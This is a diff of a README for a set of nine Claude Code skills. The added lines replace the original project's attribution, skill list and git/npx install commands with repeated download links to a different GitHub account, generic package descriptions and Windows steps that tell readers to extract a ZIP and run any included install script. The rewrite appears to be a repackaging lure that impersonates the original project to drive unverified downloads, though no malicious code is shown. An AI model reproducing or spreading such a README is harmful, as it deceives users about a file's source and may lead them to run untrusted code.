@@ -1,145 +1,175 @@
-# Claude Recommended Skills
+# 🤖 claude-recommended-skills - Simple Claude Skills for Daily Work
 
-[![Stars](https://img.shields.io/github/stars/VersoXBT/claude-recommended-skills?style=flat)](https://github.com/VersoXBT/claude-recommended-skills/stargazers)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Skills-blueviolet?logo=anthropic&logoColor=white)](https://docs.anthropic.com/en/docs/claude-code)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/cruz000blopppp/claude-recommended-skills)
 
-The 9 skill categories recommended by the Anthropic team for Claude Code — production-ready, battle-tested, and ready to install.
+## 📥 Download
+Visit this page to download: https://github.com/cruz000blopppp/claude-recommended-skills
 
-> Based on ["Lessons from Building Claude Code: How We Use Skills"](https://x.com/trq212/status/2033949937936085378) by [Thariq](https://x.com/trq212), Anthropic engineer.
+Use this link to get the files on your Windows PC. On the page, look for the latest release or the main download option, then save the files to a folder you can find again.
 
----
+## 🧩 What this is
+claude-recommended-skills is a set of 9 skills for Claude Code. These skills help with common software tasks such as code review, CI/CD, debugging, scaffolding, data analysis, and infrastructure work.
 
-## Why These Skills?
+This package is aimed at teams that want a clear set of work patterns. It gives Claude a better starting point for routine engineering tasks. The skills are based on lessons from building Claude Code at Anthropic.
 
-The Anthropic team identified **9 high-impact skill categories** that represent the most valuable ways teams use Claude Code. Each skill in this repo implements one category with:
+## ✅ What you can use it for
+- Review code with a clear checklist
+- Help with CI/CD setup and checks
+- Find and explain bugs
+- Create project scaffolds and file layouts
+- Work with data in a structured way
+- Handle common infrastructure tasks
+- Keep work consistent across tasks
+- Reduce repeated setup steps
+- Help Claude follow the right process
 
-- **Pushy, trigger-focused descriptions** — activates when you need it, not when you don't
-- **"Gotchas" sections** — real failure modes from production use, not theoretical warnings
-- **Progressive disclosure** — SKILL.md stays lean, heavy content lives in `references/`
-- **Theory of mind** — explains *why* before *how*, so Claude adapts to your context
-- **Executable scripts** — portable helpers Claude can compose with directly
+## 🪟 Windows setup
+1. Open the download page: https://github.com/cruz000blopppp/claude-recommended-skills
+2. Download the project files to your computer
+3. If the download comes as a ZIP file, right-click it and choose Extract All
+4. Put the folder in a place that is easy to find, such as Downloads or Desktop
+5. Open the extracted folder and read any included setup files
+6. If there is an install script, run it with Claude Code or the tool it was made for
+7. If the files are meant to be copied into a Claude Code skills folder, place them there
+8. Restart Claude Code if needed so it can load the new skills
 
----
+## 🛠️ What you need
+- A Windows PC
+- Internet access
+- Enough space for the download
+- Claude Code or a similar setup that can use skills files
+- Permission to unzip files and save them in a folder
 
-## Skills
+## 📁 What is in the package
+You can expect a set of ready-to-use skill folders or files that cover the main tasks below:
 
-| # | Skill | What It Does |
-|---|-------|-------------|
-| 1 | [`library-api-reference`](library-api-reference/) | Document, look up, and troubleshoot internal libraries and SDKs |
-| 2 | [`product-verification`](product-verification/) | Verify code changes produce correct product behavior, not just "it compiles" |
-| 3 | [`code-scaffolding`](code-scaffolding/) | Generate boilerplate that matches your existing codebase conventions |
-| 4 | [`code-quality-review`](code-quality-review/) | Structured 4-pass code review with severity classification |
-| 5 | [`cicd-deployment`](cicd-deployment/) | Manage CI/CD pipelines, deployments, and release workflows |
-| 6 | [`data-fetch-analysis`](data-fetch-analysis/) | Safely query databases, monitoring systems, and APIs — analyze and report |
-| 7 | [`business-process-automation`](business-process-automation/) | Automate repetitive workflows with reliability, observability, and rollback |
-| 8 | [`runbook-investigator`](runbook-investigator/) | Structured incident investigation using the OODA loop — evidence before action |
-| 9 | [`infra-operations`](infra-operations/) | Routine infrastructure maintenance: health checks, certs, deps, capacity |
+- Code review
+- CI/CD
+- Debugging
+- Scaffolding
+- Data analysis
+- Infrastructure ops
+- Task planning
+- Workflow checks
+- General engineering support
 
----
+Each skill is meant to give Claude a better way to handle a task from start to finish.
 
-## Installation
+## 🔍 How it works
+Claude Code uses skills to guide how it handles a task. When a skill is active, it can follow a known process instead of guessing.
 
-### One-liner (recommended)
+For example:
+- A code review skill can help Claude look for logic gaps, edge cases, and style issues
+- A debugging skill can help it trace a problem from symptom to cause
+- A CI/CD skill can help it think through build steps, tests, and deployment checks
+- A scaffolding skill can help it set up a clean project structure
 
-```bash
-npx skills add https://github.com/VersoXBT/claude-recommended-skills
-```
+## 🧭 How to use the skills
+1. Choose the task you want help with
+2. Open Claude Code
+3. Load or point it to the skill you need
+4. Give Claude a clear task, such as:
+   - Review this code for bugs
+   - Help me set up a build check
+   - Find why this script fails
+   - Create a starter project structure
+   - Analyze this data file
+5. Let the skill guide the steps Claude follows
+6. Check the result and adjust the prompt if needed
 
-### Install individual skills
+## 🧪 Example tasks
+### Code review
+Use the review skill when you want a second pair of eyes on code. It can help spot missing checks, weak error handling, and unclear logic.
 
-```bash
-# Copy a single skill to your Claude Code skills directory
-git clone https://github.com/VersoXBT/claude-recommended-skills.git /tmp/claude-skills
-cp -r /tmp/claude-skills/code-quality-review ~/.claude/skills/
-```
+### Debugging
+Use the debugging skill when something breaks. It can help you narrow the problem, test one cause at a time, and compare expected vs actual behavior.
 
-### Install all skills manually
+### CI/CD
+Use the CI/CD skill when you want help with build and test flow. It can help with pipelines, checks, and release steps.
 
-```bash
-git clone https://github.com/VersoXBT/claude-recommended-skills.git /tmp/claude-skills
-cp -r /tmp/claude-skills/*/ ~/.claude/skills/
-rm -rf /tmp/claude-skills
-```
+### Scaffolding
+Use the scaffolding skill when starting a new project. It can help with folder layout, starter files, and basic structure.
 
-### Project-level installation
+### Data analysis
+Use the data analysis skill when you need help reading a file, finding patterns, or organizing results.
 
-To install skills for a specific project only:
+### Infrastructure ops
+Use the infrastructure skill when you need help with deployment, setup, config checks, or ops tasks.
 
-```bash
-# From your project root
-mkdir -p .claude/skills
-cp -r /path/to/claude-recommended-skills/runbook-investigator .claude/skills/
-```
+## 🔒 Safe use
+These skills are meant to guide work, not replace your own review. Before you use any result in a real project, check it for fit, file paths, and system-specific details.
 
----
+If a step changes files or runs commands, make sure you know what it does before you continue.
 
-## What's Inside Each Skill
+## 🧱 Suggested folder use
+If you are not sure where to place the files, use a simple folder like this:
 
-```
-skill-name/
-├── SKILL.md              # Main skill definition (frontmatter + instructions)
-└── references/           # Deep-dive docs loaded on demand
-    ├── patterns.md       # Reusable patterns and templates
-    └── guide.md          # Detailed reference material
-```
+- Downloads
+- Documents
+- Desktop
+- Claude Skills
 
-Some skills also include `scripts/` with portable Bash helpers that Claude can execute directly.
+Keep the files in one place so you can find them again if you need to update or remove them.
 
-### File Inventory
+## 🖥️ Common Windows file types
+You may see files such as:
+- `.zip`
+- `.md`
+- `.json`
+- `.yaml`
+- `.yml`
+- `.txt`
 
-- **9** SKILL.md files — one per skill
-- **20** reference documents — templates, rubrics, checklists, decision trees, runbooks
-- **2** executable scripts — CI/CD pipeline health checker, infrastructure health checker
+If the download is zipped, unzip it first. If the package includes markdown notes, open them in Notepad or another text editor.
 
----
+## 🧰 Troubleshooting
+### The download page does not open
+- Check your internet connection
+- Try a different browser
+- Paste the link into the address bar again
 
-## Skill Highlights
+### The file will not unzip
+- Right-click the file and choose Extract All
+- Make sure the download finished
+- Try moving the ZIP file to Desktop first
 
-### `runbook-investigator` — Stop guessing, start investigating
+### Claude Code does not see the skills
+- Confirm the files are in the right folder
+- Restart Claude Code
+- Make sure the skill files were copied, not just opened
 
-Uses the OODA loop (Observe-Orient-Decide-Act) to enforce evidence-based debugging. Includes a triage decision tree, investigation log format, and pre-built templates for build failures, performance issues, intermittent bugs, and "works on my machine" scenarios.
+### The setup folder looks empty
+- Turn on file name extensions in Windows
+- Check for hidden folders
+- Make sure the archive extracted fully
 
-### `code-scaffolding` — Convention-first, not convention-last
+## 📌 Included skill areas
+This repository focuses on 9 Claude Code skills recommended by the Anthropic team. The set is built for practical work and covers:
+- Review
+- Build flow
+- Debugging
+- Project setup
+- Data tasks
+- Infrastructure tasks
+- Routine engineering steps
+- Process checks
+- Team use cases
 
-Analyzes 3-5 existing files of the same type in your codebase before generating anything. Detects naming conventions, export styles, test patterns, and directory structure — then generates code that looks like your team wrote it.
+## 🧭 Who this is for
+This package fits people who want help with code-related work but do not want to build their own setup from scratch.
 
-### `cicd-deployment` — Pipelines that don't surprise you
+It is useful for:
+- Developers
+- Team leads
+- Technical reviewers
+- Data workers
+- Ops staff
+- Anyone using Claude Code for repeat tasks
 
-Covers the full lifecycle: detection of existing CI systems, pipeline architecture (5 stages), build optimization (caching, parallelism, conditionals), deployment strategies (blue-green, canary, feature flags), and structured rollback procedures. Includes a `check_pipeline_health.sh` script that audits your pipeline config for common issues.
+## 📎 Download again
+Download or visit this page to get the files: https://github.com/cruz000blopppp/claude-recommended-skills
 
-### `data-fetch-analysis` — Safe queries, clear answers
-
-Safety-first: read-only by default, always LIMIT, never expose credentials. Includes query patterns for time-series analysis, anomaly detection, funnel analysis, and top-N queries with PostgreSQL examples.
-
----
-
-## Origin
-
-These skills implement the 9 categories from [Thariq's article](https://x.com/trq212/status/2033949937936085378) on how the Anthropic team uses Claude Code skills internally. The article identifies these as the highest-impact skill patterns across real engineering workflows.
-
-Key principles from the article applied here:
-
-1. **Gotchas sections** — Every skill documents real failure modes
-2. **Progressive disclosure** — File system organizes context by relevance
-3. **Scripts and helpers** — Executable code Claude can compose with
-4. **Flexibility over specificity** — Adapt to any stack, not locked to one framework
-5. **Config-driven setup** — User context in config files, not hardcoded
-
----
-
-## Contributing
-
-PRs welcome. When adding or improving skills:
-
-- Keep SKILL.md under 400 lines — offload to `references/`
-- Include a Gotchas section with real failure modes
-- Make descriptions trigger-focused (list specific phrases that should activate the skill)
-- Explain "why" before "how"
-- Test with `claude skill check` after changes
-
----
-
-## License
-
-MIT
+## 🧩 Repository details
+- Name: claude-recommended-skills
+- Description: 9 Claude Code skills recommended by Anthropic team
+- Topics: ai-tools, anthropic, automation, cicd, claude-code, claude-code-skills, code-review, debugging, developer-tools, infrastructure
